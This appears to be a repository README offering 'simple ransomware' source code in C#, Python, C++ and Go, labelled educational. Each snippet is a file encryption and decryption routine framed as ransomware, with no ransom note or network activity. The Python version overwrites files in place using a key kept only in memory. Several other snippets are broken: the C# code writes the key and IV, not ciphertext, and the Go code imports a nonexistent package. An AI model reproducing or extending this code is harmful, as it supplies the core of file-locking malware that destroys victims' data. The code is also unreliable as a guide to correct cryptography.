# Ransomware-Codes
Educational repository with source code examples

## Simple Ransomware in C#

C#
```
using System;
using System.IO;
using System.Security.Cryptography;

public class Ransomware
{
    private static string encryptionKey = "YourEncryptionKey";

    public static void EncryptFile(string filePath)
    {
        byte[] keyBytes = Encoding.ASCII.GetBytes(encryptionKey);
        using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
        {
            aes.Key = keyBytes;
            aes.GenerateIV();

            using (FileStream fs = new FileStream(filePath, FileMode.Open))
            {
                using (CryptoStream cs = new CryptoStream(fs, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        cs.Write(buffer, 0, bytesRead);
                    }
                }
            }

            byte[] iv = aes.IV;
            string encryptedFilePath = filePath + ".encrypted";
            File.WriteAllBytes(encryptedFilePath, iv.Concat(aes.Key).ToArray());
        }
    }

    public static void DecryptFile(string encryptedFilePath)
    {
        byte[] ivAndKey = File.ReadAllBytes(encryptedFilePath);
        byte[] iv = ivAndKey.Take(16).ToArray();
        byte[] key = ivAndKey.Skip(16).ToArray();

        using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
        {
            aes.Key = key;
            aes.IV = iv;

            using (FileStream fs = new FileStream(encryptedFilePath, FileMode.Open))
            {
                using (CryptoStream cs = new CryptoStream(fs, aes.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    string decryptedFilePath = encryptedFilePath.Replace(".encrypted", ".decrypted");
                    using (FileStream outputStream = new FileStream(decryptedFilePath, FileMode.Create))
                    {
                        while ((bytesRead = cs.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                }
            }
        }
    }
}
```

## Simple Ransomware in Python

Python
```
import os
import cryptography
from cryptography.fernet import Fernet

# Generate a unique encryption key
encryption_key = Fernet.generate_key()

# Encrypts a file
def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        data = file.read()
    fernet = Fernet(encryption_key)
    encrypted_data = fernet.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Decrypts a file
def decrypt_file(file_path):
    with open(file_path, 'rb') as file:
        data = file.read()
    fernet = Fernet(encryption_key)
    decrypted_data = fernet.decrypt(data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)
```

## Simple Ransomware in C++

C++
```
#include <iostream>
#include <fstream>
#include <string>
#include "aes.h"

void encryptFile(const std::string& filePath, const std::string& encryptionKey) {
    std::ifstream inputFile(filePath, std::ios::binary);
    std::ofstream outputFile(filePath + ".encrypted", std::ios::binary);

    AES aes(encryptionKey);

    while (!inputFile.eof()) {
        std::string block;
        std::getline(inputFile, block);
        std::string encryptedBlock = aes.encrypt(block);
        outputFile << encryptedBlock << std::endl;
    }

    inputFile.close();
    outputFile.close();
}

void decryptFile(const std::string& filePath, const std::string& encryptionKey) {
    std::ifstream inputFile(filePath, std::ios::binary);
    std::ofstream outputFile(filePath + ".decrypted", std::ios::binary);

    AES aes(encryptionKey);

    while (!inputFile.eof()) {
        std::string block;
        std::getline(inputFile, block);
        std::string decryptedBlock = aes.decrypt(block);
        outputFile << decryptedBlock << std::endl;
    }

    inputFile.close();
    outputFile.close();
}

int main() {
    std::string encryptionKey = "YourEncryptionKey";
    std::string filePath = "example.txt";

    encryptFile(filePath, encryptionKey);
    decryptFile(filePath + ".encrypted", encryptionKey);

    return 0;
}
```

## Simple Ransomware in Golang

Go
```
package main

import (
	"fmt"
	"io/ioutil"
	"os"

	"github.com/encrypt"
)

func encryptFile(filePath string, encryptionKey string) {
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		fmt.Println(err)
		return
	}
	encryptedData := encrypt.Encrypt(data, encryptionKey)
	err = ioutil.WriteFile(filePath, encryptedData, 0644)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func decryptFile(filePath string, encryptionKey string) {
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		fmt.Println(err)
		return
	}
	decryptedData := encrypt.Decrypt(data, encryptionKey)
	err = ioutil.WriteFile(filePath, decryptedData, 0644)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func main() {
	encryptionKey := "YourEncryptionKey"
	filePath := "example.txt"

	encryptFile(filePath, encryptionKey)
	decryptFile(filePath, encryptionKey)
}
```
